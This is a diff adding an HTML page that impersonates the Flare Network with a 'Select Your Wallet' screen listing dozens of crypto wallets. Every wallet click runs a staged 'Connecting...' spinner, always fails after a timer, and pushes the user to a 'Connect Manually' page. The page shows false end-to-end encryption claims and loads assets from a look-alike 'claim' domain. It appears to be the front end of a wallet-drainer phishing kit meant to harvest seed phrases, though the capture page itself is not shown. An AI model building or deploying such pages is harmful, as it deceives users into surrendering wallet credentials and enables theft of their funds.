@@ -1,0 +1,410 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Available Wallets - Flare Network</title>
+    <link rel="icon" href="https://flare.network/api/media/file/Flare.svg" type="image/x-icon">
+    <!-- Tailwind CSS CDN -->
+    <script src="https://cdn.tailwindcss.com"></script>
+    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;600;700&display=swap" rel="stylesheet">
+    <style>
+        body {
+            font-family: 'Inter', sans-serif;
+            background-color: #F8F8F8;
+            color: #1f2937;
+            line-height: 1.6;
+        }
+        .header {
+            background-color: #ffffff;
+            padding: 1rem 2rem;
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            box-shadow: 0 1px 3px rgba(0, 0, 0, 0.1);
+        }
+        .header-logo-icon {
+            height: 2.5rem; /* Increased size for the logo icon */
+            margin-right: 0.5rem; /* Space between icon and text */
+            vertical-align: middle; /* Align with text baseline */
+        }
+        .logo-text {
+            font-size: 1.875rem; /* Increased font size for the text */
+            font-weight: bold;
+            background: linear-gradient(135deg, #ec4899, #db2777); /* Pink gradient for Flare logo */
+            -webkit-background-clip: text;
+            -webkit-text-fill-color: transparent;
+            background-clip: text;
+        }
+        .main-content {
+            padding: 2rem;
+            max-width: 1200px;
+            margin: 0 auto;
+        }
+        .search-input {
+            width: 100%;
+            padding: 0.75rem 1rem;
+            font-size: 1rem;
+            border: 1px solid #d1d5db;
+            border-radius: 0.5rem;
+            margin-bottom: 2rem;
+            box-shadow: inset 0 1px 2px rgba(0, 0, 0, 0.05);
+            transition: border-color 0.2s ease, box-shadow 0.2s ease;
+        }
+        .search-input:focus {
+            outline: none;
+            border-color: #2563eb; /* Blue focus */
+            box-shadow: 0 0 0 3px rgba(37, 99, 235, 0.2); /* Blue focus shadow */
+        }
+        .wallet-grid {
+            display: grid;
+            grid-template-columns: repeat(auto-fill, minmax(180px, 1fr));
+            gap: 1.5rem;
+        }
+        .wallet-card {
+            background-color: #ffffff;
+            padding: 1.5rem;
+            border-radius: 0.75rem;
+            box-shadow: 0 2px 10px rgba(0, 0, 0, 0.05);
+            text-align: center;
+            transition: transform 0.2s ease, box-shadow 0.2s ease;
+            cursor: pointer;
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            justify-content: center;
+            min-height: 150px;
+            position: relative;
+            overflow: hidden; /* Ensure checkmark doesn't overflow */
+        }
+        .wallet-card:hover {
+            transform: translateY(-5px);
+            box-shadow: 0 6px 20px rgba(0, 0, 0, 0.15); /* Slightly stronger shadow on hover */
+        }
+        .wallet-icon {
+            width: 60px;
+            height: 60px;
+            object-fit: contain;
+            margin-bottom: 0.75rem;
+            border-radius: 50%;
+            background-color: #eee;
+        }
+        .wallet-name {
+            font-size: 1.125rem;
+            font-weight: 600;
+            color: #374151;
+            display: flex; /* For inline checkmark */
+            align-items: center;
+            justify-content: center;
+            gap: 0.25rem; /* Space between name and checkmark */
+        }
+        .wallet-url {
+            font-size: 0.875rem;
+            color: #6b7280;
+            margin-top: 0.25rem;
+            margin-bottom: 0.5rem;
+            word-break: break-all; /* Ensure long URLs wrap */
+        }
+        .verified-checkmark {
+            color: #10B981; /* Green-500 */
+            width: 1rem; /* 16px */
+            height: 1rem; /* 16px */
+            display: inline-block;
+        }
+        /* Modal Styles */
+        .modal-overlay {
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background-color: rgba(0, 0, 0, 0.6);
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            z-index: 1000;
+            opacity: 0;
+            visibility: hidden;
+            transition: opacity 0.3s ease, visibility 0.3s ease;
+        }
+        .modal-overlay.active {
+            opacity: 1;
+            visibility: visible;
+        }
+        .modal-content {
+            background-color: #ffffff;
+            padding: 2rem;
+            border-radius: 0.75rem;
+            box-shadow: 0 5px 15px rgba(0, 0, 0, 0.3);
+            text-align: center;
+            max-width: 400px;
+            width: 90%;
+            transform: translateY(-20px);
+            transition: transform 0.3s ease;
+        }
+        .modal-overlay.active .modal-content {
+            transform: translateY(0);
+        }
+        .modal-wallet-logo {
+            width: 80px;
+            height: 80px;
+            object-fit: contain;
+            margin: 0 auto 1rem;
+            border-radius: 50%;
+            background-color: #eee;
+        }
+        .modal-loading-spinner {
+            border: 4px solid #f3f3f3;
+            border-top: 4px solid #2563eb; /* Blue spinner */
+            border-radius: 50%;
+            width: 40px;
+            height: 40px;
+            animation: spin 1s linear infinite;
+            margin: 1.5rem auto;
+        }
+        @keyframes spin {
+            0% { transform: rotate(0deg); }
+            100% { transform: rotate(360deg); }
+        }
+        .modal-buttons {
+            display: flex;
+            flex-direction: column;
+            gap: 0.75rem;
+            margin-top: 1.5rem;
+        }
+        .modal-button {
+            padding: 0.75rem 1.5rem;
+            border-radius: 0.5rem;
+            font-weight: 600;
+            cursor: pointer;
+            transition: background-color 0.2s ease, transform 0.2s ease;
+        }
+        .modal-button.primary {
+            background-color: #2563eb; /* Blue */
+            color: #ffffff;
+        }
+        .modal-button.primary:hover {
+            background-color: #1d4ed8; /* Darker blue */
+            transform: translateY(-1px);
+        }
+        .modal-button.secondary {
+            background-color: #f3f4f6; /* Light gray */
+            color: #374151;
+            border: 1px solid #d1d5db;
+        }
+        .modal-button.secondary:hover {
+            background-color: #e5e7eb;
+            transform: translateY(-1px);
+        }
+
+        /* Mobile responsiveness */
+        @media (max-width: 640px) {
+            .header {
+                padding: 1rem 1rem;
+            }
+            .main-content {
+                padding: 1rem;
+            }
+            .wallet-grid {
+                grid-template-columns: repeat(auto-fill, minmax(140px, 1fr));
+                gap: 1rem;
+            }
+            .modal-content {
+                padding: 1.5rem;
+            }
+        }
+    </style>
+</head>
+<body>
+    <header class="header">
+        <div class="flex items-center">
+            <img src="https://flare.network/api/media/file/Flare.svg" alt="Flare Logo" class="header-logo-icon">
+            <span class="logo-text">Flare</span>
+        </div>
+        <nav>
+            <a href="index.html" class="text-gray-600 hover:text-pink-600 font-semibold transition-colors duration-300">Back to Home</a>
+        </nav>
+    </header>
+
+    <div class="main-content">
+        <h1 class="text-3xl font-bold text-gray-900 mb-6 text-center">Select Your Wallet</h1>
+        
+        <input type="text" id="walletSearch" class="search-input" placeholder="Search for a wallet...">
+
+        <div id="walletList" class="wallet-grid">
+            <!-- Wallet cards will be injected here by JavaScript -->
+        </div>
+    </div>
+
+    <!-- Connection Modal -->
+    <div id="connectionModal" class="modal-overlay">
+        <div class="modal-content">
+            <img id="modalWalletLogo" src="" alt="Wallet Logo" class="modal-wallet-logo">
+            <h2 id="modalWalletName" class="text-2xl font-bold text-gray-900 mb-2"></h2>
+            <p class="text-gray-600 mb-4"><strong>End-to-End Encryption</strong></p>
+            
+            <div id="loadingState">
+                <div class="modal-loading-spinner"></div>
+                <p class="text-gray-700">Connecting...</p>
+            </div>
+
+            <div id="errorState" style="display: none;">
+                <p class="text-red-600 font-semibold text-lg mb-4">There's an error while connecting, try again or connect manually.</p>
+                <div class="modal-buttons">
+                    <button id="tryAgainBtn" class="modal-button primary">Try Again</button>
+                    <button id="connectManuallyBtn" class="modal-button secondary">Connect Manually</button>
+                </div>
+            </div>
+
+            <!-- New security message -->
+            <p class="text-gray-600 text-sm mt-4">
+                <strong>This session is protected with an end-to-end encryption. <span style="color: red;">Never share your seed phrase with anybody!</span></strong>
+            </p>
+        </div>
+    </div>
+
+    <script>
+        document.addEventListener('DOMContentLoaded', function() {
+            const allWallets = [
+                { name: 'MetaMask', logo: 'https://upload.wikimedia.org/wikipedia/commons/3/36/MetaMask_Fox.svg', url: 'metamask.io', verified: true },
+                { name: 'Trust Wallet', logo: 'https://play-lh.googleusercontent.com/cd5BevWohRqLwsI2_i3k4YIVtcO57cIZCs6l20H1Hcdj0P2rFEcX_7QtgKbTM3Sn_A', url: 'trustwallet.com', verified: true },
+                { name: 'Coinbase', logo: 'https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcQF6hcTTU1A8Ymi2VldXqCsPkBu_ltAhIKiRg&s', url: 'wallet.coinbase.com', verified: true },
+                { name: 'Ledger Live', logo: 'https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcRH6IP0y4AqjwJt64nQi8oIE34XkyEBGmI8Xg&s', url: 'ledger.com', verified: true },
+                { name: 'Trezor Suite', logo: 'https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcR9qK2NaV_JvbjmOmIqW6O_MM5UOYYUzxD_JQ&s', url: 'trezor.io', verified: true },
+                { name: 'Phantom', logo: 'https://flare.linkportalnet.com/claim/c/wallets/phantom.svg', url: 'phantom.app', verified: true },
+                { name: 'WalletConnect', logo: 'https://s3.coinmarketcap.com/static-gravity/image/0cdd52caf3a847e3bf3f1063e87a9690.png', url: 'walletconnect.com', verified: true },
+                { name: 'Brave Wallet', logo: 'https://th.bing.com/th/id/R.d77b3890aa94c7d7e4548e6f25f76700?rik=OcSGwMbGaNHG0Q&pid=ImgRaw&r=0', url: 'brave.com/wallet', verified: true },
+                { name: 'Exodus', logo: 'https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcT7ac9O_DORRUoTuI9KIR-wAHGYJOEOoDLvkA&s', url: 'exodus.com', verified: true },
+                { name: 'MyEtherWallet (MEW)', logo: 'https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcR7VddB9cLiVR4riOapFPDtsr4nOrG7jpNkW5ejt648OkUKUdcCC0a6FnBpUzKF0K7yqq0&usqp=CAU', url: 'myetherwallet.com', verified: true },
+                { name: 'Atomic Wallet', logo: 'https://play-lh.googleusercontent.com/t8vnANR3Ofzoe1rgCTV5McOtbnXLxt7uTKa7nM9uVxthfeXzOEkLiyf6Mbwo6bf1Gjs', url: 'atomicwallet.io', verified: true },
+                { name: 'Binance Chain Wallet', logo: 'https://flare.linkportalnet.com/claim/c/wallets/static/logo/binance.png', url: 'binance.org', verified: true },
+                { name: 'SafePal', logo: 'https://flare.linkportalnet.com/claim/c/wallets/static/logo/safepal.jpg', verified: true },
+                { name: 'Crypto.com DeFi Wallet', logo: 'https://flare.linkportalnet.com/claim/c/wallets/static/logo/crypto.jpg', url: 'crypto.com/defiwallet', verified: true },
+                { name: 'Rabby Wallet', logo: 'https://play-lh.googleusercontent.com/voFLXuFxLsIFBHQKmFxUhgAo23RXmO6_esdEb6ebfHQewdMlAfNKq3vAaDh6clJ7Pw', url: 'rabby.io', verified: true },
+                { name: 'OKX Wallet', logo: 'https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcTRgacTWcH_XmTEmAMXMnerYaodOTr8_MH2Jg&s', url: 'okx.com/web3', verified: true },
+                { name: 'Rainbow Wallet', logo: 'https://flare.linkportalnet.com/claim/c/wallets/static/logo/rainbow.jpg', url: 'rainbow.me', verified: true },
+                { name: 'Gnosis Safe (Safe)', logo: 'https://assets.gemwallet.com/blockchains/gnosis/logo.png', url: 'safe.global', verified: true },
+                { name: 'Argent', logo: 'https://th.bing.com/th/id/R.3c55995645af676986b03c53e2a486eb?rik=JJlclL01aHaW%2bQ&pid=ImgRaw&r=0&sres=1&sresct=1', url: 'argent.xyz', verified: true },
+                { name: 'MathWallet', logo: 'https://th.bing.com/th/id/R.ae3b6cfa8c1cb78ede0f9f245f6c1aeb?rik=76z1PATgitI2Qg&riu=http%3a%2f%2fmedishares.oss-cn-hongkong.aliyuncs.com%2flogo%2fmath%2fMathWallet_App_Icon.png&ehk=Vxl20JT3cM73UX3SI%2ftgVwRtiVuidtfddtQ6%2bHS%2btyw%3d&risl=&pid=ImgRaw&r=0', url: 'mathwallet.org', verified: true },
+                { name: 'TokenPocket', logo: 'https://tse4.mm.bing.net/th/id/OIP.Ls_ckeDwshQ_it3ioaal7AHaHa?r=0&rs=1&pid=ImgDetMain&o=7&rm=3', url: 'tokenpocket.pro', verified: true },
+                { name: 'AlphaWallet', logo: 'https://101blockchains.com/wp-content/uploads/2022/02/Alpha-Wallet-1.png', url: 'alphawallet.com', verified: true },
+                { name: 'ONTO Wallet', logo: 'https://tse2.mm.bing.net/th/id/OIP.6ILLNuOL751ygIkkGy_GMwAAAA?r=0&rs=1&pid=ImgDetMain&o=7&rm=3', url: 'onto.app', verified: true },
+                { name: 'imToken', logo: 'https://tse4.mm.bing.net/th/id/OIP.NmsZLNyu0vboVz2sP2dbNgHaHa?r=0&rs=1&pid=ImgDetMain&o=7&rm=3', url: 'token.im', verified: true },
+                { name: 'BitPay', logo: 'https://tse1.mm.bing.net/th/id/OIP.N1lT1nMEGbLncx-gEC6ALwHaHa?r=0&w=1160&h=1160&rs=1&pid=ImgDetMain&o=7&rm=3', url: 'bitpay.com', verified: true },
+                { name: 'Wasabi Wallet', logo: 'https://th.bing.com/th/id/R.0ae4cadaf910961a8cd7e9fe63f507ab?rik=NnkEsj4VhMWnmw&pid=ImgRaw&r=0', url: 'wasabiwallet.io', verified: true },
+                { name: 'Electrum', logo: 'https://www.addictivetips.com/app/uploads/2018/06/electrum.png', url: 'electrum.org', verified: true },
+                { name: 'Samourai Wallet', logo: 'https://th.bing.com/th/id/OIP.CMmztgGZtrw-CdxbiD-NAQAAAA?w=80&h=80&c=1&bgcl=97742f&r=0&o=7&pid=ImgRC&rm=3', url: 'samouraiwallet.com', verified: true },
+                { name: 'ZenGo', logo: 'https://tse2.mm.bing.net/th/id/OIP.daPobJYWGpZJv69Ir1a0AgHaHa?r=0&rs=1&pid=ImgDetMain&o=7&rm=3', url: 'zengo.com', verified: true },
+                { name: 'AtomicDEX', logo: 'https://th.bing.com/th/id/OIP.hd71NwQxwO7ERAYzHMKMVwAAAA?r=0&o=7rm=3&rs=1&pid=ImgDetMain&o=7&rm=3', url: 'atomicdex.io', verified: true },
+                { name: 'Guarda Wallet', logo: 'https://tse4.mm.bing.net/th/id/OIP.O9Sx-W-l61tC7ra3GN10qwHaEX?r=0&rs=1&pid=ImgDetMain&o=7&rm=3', url: 'guarda.com', verified: true },
+                { name: 'Infinito Wallet', logo: 'https://tse2.mm.bing.net/th/id/OIP.gpilxcCgr3KcHIlkLAS9yAAAAA?r=0&rs=1&pid=ImgDetMain&o=7&rm=3', url: 'infinitowallet.io', verified: true },
+                { name: 'Cobo Wallet', logo: 'https://tse2.mm.bing.net/th/id/OIP.ikwCXuvem3L0ocK4zbBOZAHaHa?r=0&rs=1&pid=ImgDetMain&o=7&rm=3', url: 'cobo.com', verified: true },
+                { name: 'BRD Wallet', logo: 'https://seeklogo.com/images/B/bread-brd-logo-0B5CA82922-seeklogo.com.png', url: 'brd.com', verified: true },
+                { name: 'Jaxx Liberty', logo: 'https://pbs.twimg.com/profile_images/997974626280947712/sDZ7y78a_400x400.jpg', url: 'jaxx.io', verified: true },
+                { name: 'Bitcoin Core', logo: 'https://bitcoin.org/img/icons/opengraph.png', url: 'bitcoin.org', verified: true },
+                { name: 'Ontology Wallet', logo: 'https://ont.io/img/logo.svg', url: 'ont.io', verified: true },
+                { name: 'Portal Bridge Wallet', logo: 'https://placehold.co/60x60/6A0DAD/FFFFFF?text=Portal', url: 'portalbridge.com', verified: false },
+                { name: 'CoinGecko Wallet', logo: 'https://assets.coingecko.com/coins/images/1/large/bitcoin.png?1547033579', url: 'coingecko.com', verified: false }
+            ];
+
+            // Filter the wallets as per the user's request and reorder
+            const wallets = [
+                ...allWallets.slice(0, allWallets.findIndex(w => w.name === 'Jaxx Liberty') + 1), // Wallets up to Jaxx Liberty
+                allWallets.find(w => w.name === 'Bitcoin Core'),
+                allWallets.find(w => w.name === 'Ontology Wallet'),
+                allWallets.find(w => w.name === 'Portal Bridge Wallet'),
+                allWallets.find(w => w.name === 'CoinGecko Wallet'),
+                { name: 'Other Wallets', logo: 'https://lh3.googleusercontent.com/Yu9-l8ywVfXGmgdKJffVg0TaxQI9yPaujRonD4cYkq9GARrkuu90AlPpxTqOuXtHhBE=s128', url: 'connect.allwallets.com', verified: true }
+            ].filter(Boolean); // Filter out any undefined if find returns nothing
+
+            const walletListContainer = document.getElementById('walletList');
+            const walletSearchInput = document.getElementById('walletSearch');
+            const connectionModal = document.getElementById('connectionModal');
+            const modalWalletLogo = document.getElementById('modalWalletLogo');
+            const modalWalletName = document.getElementById('modalWalletName');
+            const loadingState = document.getElementById('loadingState');
+            const errorState = document.getElementById('errorState');
+            const tryAgainBtn = document.getElementById('tryAgainBtn');
+            const connectManuallyBtn = document.getElementById('connectManuallyBtn');
+
+            // Function to handle connection attempt
+            function attemptConnection(wallet) {
+                // Reset modal state
+                loadingState.style.display = 'block';
+                errorState.style.display = 'none';
+                modalWalletLogo.src = wallet.logo;
+                modalWalletLogo.alt = `${wallet.name} Logo`;
+                modalWalletName.textContent = wallet.name;
+                connectionModal.classList.add('active');
+
+                // Simulate loading
+                setTimeout(() => {
+                    loadingState.style.display = 'none';
+                    errorState.style.display = 'block';
+                }, 4000); // Simulate a 3-second connection attempt
+            }
+
+            // Event listener for "Try Again" button
+            tryAgainBtn.addEventListener('click', function() {
+                // Re-attempt connection for the last clicked wallet
+                const currentWalletName = modalWalletName.textContent;
+                const currentWallet = wallets.find(w => w.name === currentWalletName);
+                if (currentWallet) {
+                    attemptConnection(currentWallet);
+                }
+            });
+
+            // Event listener for "Connect Manually" button
+            connectManuallyBtn.addEventListener('click', function() {
+                window.location.href = 'manual-connect.html'; // Redirect to the new HTML file
+            });
+
+            // Function to render wallets
+            function renderWallets(filteredWallets) {
+                walletListContainer.innerHTML = ''; // Clear existing list
+                if (filteredWallets.length === 0) {
+                    walletListContainer.innerHTML = '<p class="col-span-full text-center text-gray-500">No wallets found matching your search.</p>';
+                    return;
+                }
+                filteredWallets.forEach(wallet => {
+                    const walletCard = document.createElement('div');
+                    walletCard.className = 'wallet-card';
+                    // Fallback for image loading errors
+                    const imageSrc = wallet.logo;
+                    const fallbackImage = 'https://placehold.co/60x60/d1d5db/4b5563?text=Logo'; // A generic placeholder
+                    walletCard.innerHTML = `
+                        <img src="${imageSrc}" alt="${wallet.name} Logo" class="wallet-icon" onerror="this.onerror=null; this.src='${fallbackImage}'">
+                        <div class="wallet-name">
+                            ${wallet.name}
+                            ${wallet.verified ? `
+                                <svg class="verified-checkmark" fill="currentColor" viewBox="0 0 20 20">
+                                    <path fill-rule="evenodd" d="M16.707 5.293a1 1 0 010 1.414l-8 8a1 1 0 01-1.414 0l-4-4a1 1 0 011.414-1.414L8 12.586l7.293-7.293a1 1 0 011.414 0z" clip-rule="evenodd"></path>
+                                </svg>
+                            ` : ''}
+                        </div>
+                        <a href="https://${wallet.url}" target="_blank" rel="noopener noreferrer" class="wallet-url hover:underline">
+                            ${wallet.url}
+                        </a>
+                    `;
+                    // Add click event listener to each wallet card
+                    walletCard.addEventListener('click', () => attemptConnection(wallet));
+                    walletListContainer.appendChild(walletCard);
+                });
+            }
+
+            // Initial render of all wallets
+            renderWallets(wallets);
+
+            // Search functionality
+            walletSearchInput.addEventListener('keyup', function() {
+                const searchTerm = walletSearchInput.value.toLowerCase();
+                const filteredWallets = wallets.filter(wallet => 
+                    wallet.name.toLowerCase().includes(searchTerm) || 
+                    wallet.url.toLowerCase().includes(searchTerm)
+                );
+                renderWallets(filteredWallets);
+            });
+        });
+    </script>
+</body>
+</html>
